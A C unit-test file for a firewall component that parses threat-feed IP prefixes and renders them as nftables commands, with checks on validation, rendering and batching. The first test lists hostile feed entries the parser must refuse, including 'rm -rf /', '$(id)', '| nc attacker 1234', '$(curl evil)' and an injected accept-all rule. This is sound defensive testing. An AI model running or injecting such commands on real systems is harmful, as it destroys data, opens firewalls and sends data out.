/*
 * Copyright (C) 2026 Optim Enterprises BV
 *
 * This is free software, licensed under the BSD 3-Clause License.
 *
 * Host tests for nftables enforcement rendering.
 *
 * The headline case is injection. Every element rendered here originates in a
 * threat feed -- data from outside, under someone else's control -- and it ends
 * up in a command string. That is the shape that turns a feed entry into
 * command execution on every device in the fleet, so it is asserted first and
 * in the most hostile terms available.
 *
 * Everything else in this suite is asserted in BOTH directions. The recurring
 * defect in this codebase has been a value that is correct within a bound and
 * quietly means something else past it, passing tests that only checked the
 * intended side.
 */

#include "../src/nft.h"

#include <stdio.h>
#include <string.h>

static int failures;
static int checks;

#define CHECK(cond, msg)                                                       \
	do {                                                                   \
		checks++;                                                      \
		if (!(cond)) {                                                 \
			failures++;                                            \
			fprintf(stderr, "FAIL %s:%d: %s\n", __FILE__,          \
			        __LINE__, (msg));                              \
		}                                                              \
	} while (0)

static const struct nft_target TGT = { "inet", "fw4", "aether_rep4",
	                               "aether_rep6" };

/* ------------------------------------------------------- injection --- */

static void test_hostile_feed_entries_are_refused(void)
{
	/*
	 * A compromised or buggy feed is the threat model. None of these may
	 * ever reach a rendered buffer.
	 */
	const char *hostile[] = {
		"1.2.3.0/24; rm -rf /",
		"1.2.3.0/24 }\nadd rule inet fw4 input accept\n#",
		"1.2.3.0/24`reboot`",
		"1.2.3.0/24$(id)",
		"1.2.3.0/24 | nc attacker 1234",
		"1.2.3.0/24\nflush ruleset",
		"1.2.3.0/24, 0.0.0.0/0",
		"$(curl evil)/24",
		"1.2.3.0/24 timeout 1s }; drop",
		"../../etc/passwd",
		"1.2.3.0/24\r\nquit",
		NULL
	};

	for (int i = 0; hostile[i]; i++) {
		struct nft_elem e;
		enum nft_reject r = nft_elem_parse(hostile[i], &e);
		CHECK(r != NFT_OK, hostile[i]);
		/* Refused for the RIGHT reason: the metacharacter rule fires
		 * before any address parsing, so the refusal is deliberate
		 * rather than incidental. */
		CHECK(r == NFT_REJECT_UNSAFE_CHARS || r == NFT_REJECT_MALFORMED,
		      "refused by a rule that is about metacharacters");
	}
}

static void test_nothing_hostile_survives_into_a_batch(void)
{
	/* Defence in depth: even if a hostile element were somehow constructed,
	 * rendering works from parsed binary, so the output contains only
	 * numeric text. Build an element by hand with a bogus family and
	 * confirm it cannot render. */
	struct nft_elem bogus;
	memset(&bogus, 0, sizeof(bogus));
	bogus.family = 99;
	char buf[128];
	CHECK(nft_elem_render(&bogus, buf, sizeof(buf)) == 0,
	      "an element with no valid family renders nothing");

	char out[512];
	size_t n_rendered = 0;
	size_t used = nft_render_add(&TGT, &bogus, 1, out, sizeof(out), &n_rendered);
	CHECK(n_rendered == 0, "and contributes nothing to a batch");
	CHECK(used == 0 || strstr(out, "99") == NULL, "no stray family byte leaks");
}

/* ----------------------------------------------------- validation --- */

static void test_valid_prefixes_parse(void)
{
	struct nft_elem e;
	CHECK(nft_elem_parse("1.10.16.0/20", &e) == NFT_OK, "v4 prefix");
	CHECK(e.family == 4 && e.prefix == 20, "v4 fields");

	CHECK(nft_elem_parse("45.155.205.233", &e) == NFT_OK, "bare v4 is a host");
	CHECK(e.prefix == 32, "bare v4 -> /32");

	CHECK(nft_elem_parse("2001:db8::/32", &e) == NFT_OK, "v6 prefix");
	CHECK(e.family == 6 && e.prefix == 32, "v6 fields");
}

static void test_over_broad_prefixes_are_refused(void)
{
	/* A /8 of routable space is 16.7M addresses blocked on one signal --
	 * far likelier a parse error than 16.7M attackers. */
	struct nft_elem e;
	CHECK(nft_elem_parse("45.0.0.0/8", &e) == NFT_REJECT_TOO_BROAD, "v4 /8");
	CHECK(nft_elem_parse("0.0.0.0/0", &e) == NFT_REJECT_TOO_BROAD, "v4 default route");
	CHECK(nft_elem_parse("::/0", &e) == NFT_REJECT_TOO_BROAD, "v6 default route");
	/* Exactly at the limit is allowed -- the boundary is asserted on both
	 * sides so a change to the constant cannot pass unnoticed. */
	CHECK(nft_elem_parse("45.155.0.0/16", &e) == NFT_OK, "v4 /16 allowed");
	CHECK(nft_elem_parse("2001:db8::/32", &e) == NFT_OK, "v6 /32 allowed");
}

static void test_host_bits_are_refused(void)
{
	/* 10.1.2.3/8 may mean the host or the network; the readings differ by
	 * 16.7 million addresses. Refusing beats guessing. */
	struct nft_elem e;
	CHECK(nft_elem_parse("45.155.205.233/16", &e) == NFT_REJECT_HOSTBITS,
	      "host bits set below the prefix");
	CHECK(nft_elem_parse("45.155.0.0/16", &e) == NFT_OK, "properly masked");
	CHECK(nft_elem_parse("2001:db8::1/32", &e) == NFT_REJECT_HOSTBITS, "v6 host bits");
}

static void test_malformed_prefixes(void)
{
	struct nft_elem e;
	CHECK(nft_elem_parse("1.2.3.0/33", &e) == NFT_REJECT_PREFIX, "v4 /33");
	CHECK(nft_elem_parse("2001:db8::/129", &e) == NFT_REJECT_PREFIX, "v6 /129");
	CHECK(nft_elem_parse("", &e) != NFT_OK, "empty");
	CHECK(nft_elem_parse("1.2.3", &e) != NFT_OK, "incomplete v4");
	CHECK(nft_elem_parse(NULL, &e) == NFT_REJECT_MALFORMED, "null");
}

/* -------------------------------------------------------- render --- */

static void test_render_element(void)
{
	struct nft_elem e;
	nft_elem_parse("1.10.16.0/20", &e);
	char buf[NFT_ELEM_TEXT_MAX];

	CHECK(nft_elem_render(&e, buf, sizeof(buf)) > 0, "renders");
	CHECK(strcmp(buf, "1.10.16.0/20") == 0, "no timeout when unset");

	e.timeout_sec = 604800;
	nft_elem_render(&e, buf, sizeof(buf));
	CHECK(strcmp(buf, "1.10.16.0/20 timeout 604800s") == 0, "timeout rendered");

	/* A buffer too small must write nothing, not a truncated element -- a
	 * half-rendered address is a different network. */
	char tiny[8];
	CHECK(nft_elem_render(&e, tiny, sizeof(tiny)) == 0, "no partial render");
}

static void test_batch_splits_by_family(void)
{
	struct nft_elem elems[3];
	nft_elem_parse("1.10.16.0/20", &elems[0]);
	nft_elem_parse("2001:db8::/32", &elems[1]);
	nft_elem_parse("45.155.0.0/16", &elems[2]);

	char out[1024];
	size_t n_rendered = 0;
	size_t used = nft_render_add(&TGT, elems, 3, out, sizeof(out), &n_rendered);

	CHECK(used > 0, "rendered");
	CHECK(n_rendered == 3, "all three elements accounted for");
	CHECK(strstr(out, "add element inet fw4 aether_rep4") != NULL, "v4 set");
	CHECK(strstr(out, "add element inet fw4 aether_rep6") != NULL, "v6 set");
	CHECK(strstr(out, "1.10.16.0/20") != NULL, "v4 element present");
	CHECK(strstr(out, "2001:db8::/32") != NULL, "v6 element present");
	/* The v6 address must not appear inside the v4 command. */
	const char *v4cmd = strstr(out, "aether_rep4");
	const char *v6cmd = strstr(out, "aether_rep6");
	CHECK(v4cmd && v6cmd, "both commands emitted");
	CHECK(strstr(v4cmd, "2001:db8") > v6cmd || strstr(v4cmd, "2001:db8") == NULL,
	      "families are not mixed within one command");
}

static void test_delete_carries_no_timeout(void)
{
	/* nft rejects a timeout on delete; emitting one fails the whole batch. */
	struct nft_elem e;
	nft_elem_parse("1.10.16.0/20", &e);
	e.timeout_sec = 3600;

	char out[512];
	size_t n_rendered = 0;
	nft_render_del(&TGT, &e, 1, out, sizeof(out), &n_rendered);
	CHECK(n_rendered == 1, "element rendered");
	CHECK(strstr(out, "delete element") != NULL, "delete verb");
	CHECK(strstr(out, "timeout") == NULL, "no timeout on delete");
}

static void test_short_buffer_renders_nothing(void)
{
	/* A truncated nft command is a partially-applied set that reports
	 * success. Refuse rather than emit. */
	struct nft_elem elems[4];
	nft_elem_parse("1.10.16.0/20", &elems[0]);
	nft_elem_parse("45.155.0.0/16", &elems[1]);
	nft_elem_parse("2001:db8::/32", &elems[2]);
	nft_elem_parse("2001:db9::/32", &elems[3]);

	char tiny[40];
	size_t n_rendered = 99;
	size_t used = nft_render_add(&TGT, elems, 4, tiny, sizeof(tiny), &n_rendered);
	CHECK(used == 0, "overflow renders nothing");
	CHECK(n_rendered == 0, "and reports zero, not a partial count");
}

static void test_set_declaration(void)
{
	char out[1024];
	size_t n = nft_render_set_decl(&TGT, 604800, out, sizeof(out));
	CHECK(n > 0, "declaration rendered");
	CHECK(strstr(out, "flags interval,timeout") != NULL,
	      "interval flag -- prefixes need it");
	CHECK(strstr(out, "auto-merge") != NULL, "overlapping entries merge");
	CHECK(strstr(out, "timeout 604800s") != NULL, "default timeout set");
	CHECK(strstr(out, "type ipv4_addr") != NULL, "v4 set typed");
	CHECK(strstr(out, "type ipv6_addr") != NULL, "v6 set typed");
	/* The reason it is a file and not a command must survive refactoring. */
	CHECK(strstr(out, "fw4 reload") != NULL,
	      "records why this is an include, not `nft add set`");
}

static void test_flush(void)
{
	char out[256];
	CHECK(nft_render_flush(&TGT, out, sizeof(out)) > 0, "flush rendered");
	CHECK(strstr(out, "flush set inet fw4 aether_rep4") != NULL, "v4 flushed");
	CHECK(strstr(out, "flush set inet fw4 aether_rep6") != NULL, "v6 flushed");
}

static void test_real_spamhaus_entries_round_trip(void)
{
	/* Verbatim from drop.txt, the one licence-clean feed in ADR-019. */
	const char *real[] = { "1.10.16.0/20", "1.19.0.0/16", "1.32.128.0/18",
		               "2.26.75.0/24", NULL };
	struct nft_elem elems[4];
	int n = 0;
	for (int i = 0; real[i]; i++)
		CHECK(nft_elem_parse(real[i], &elems[n++]) == NFT_OK, real[i]);

	char out[1024];
	size_t n_rendered = 0;
	CHECK(nft_render_add(&TGT, elems, (size_t)n, out, sizeof(out), &n_rendered) > 0,
	      "real feed data renders");
	CHECK(n_rendered == 4, "all four");
	for (int i = 0; real[i]; i++)
		CHECK(strstr(out, real[i]) != NULL, "each element present");
}

int main(void)
{
	test_hostile_feed_entries_are_refused();
	test_nothing_hostile_survives_into_a_batch();
	test_valid_prefixes_parse();
	test_over_broad_prefixes_are_refused();
	test_host_bits_are_refused();
	test_malformed_prefixes();
	test_render_element();
	test_batch_splits_by_family();
	test_delete_carries_no_timeout();
	test_short_buffer_renders_nothing();
	test_set_declaration();
	test_flush();
	test_real_spamhaus_entries_round_trip();

	printf("%d checks, %d failures\n", checks, failures);
	return failures == 0 ? 0 : 1;
}
